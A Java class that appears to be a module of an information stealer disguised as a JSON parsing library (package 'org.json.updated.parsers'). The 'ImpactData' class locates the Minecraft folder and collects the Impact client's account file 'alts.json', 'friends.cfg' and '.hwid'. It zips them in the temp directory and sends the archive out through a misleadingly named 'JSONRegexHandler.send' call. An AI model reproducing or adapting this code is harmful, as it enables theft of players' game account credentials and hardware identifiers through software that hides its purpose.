package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;
import org.json.updated.parsers.util.JSONBuilder;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class ImpactData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[] { "alts.json", "friends.cfg", ".hwid" };

    @Override
    public void handle() {
        String mcFolder = FileSystemHelper.getMinecraftFolder();
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String impactFolder = mcFolder + "Impact/";
        if (!Files.exists(Paths.get(impactFolder))) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Impact folder.").build());
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>();
        for (String fileName : IMPORTANT_FILES) {
            String dir = impactFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "impact_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "ImpactData";
    }
}
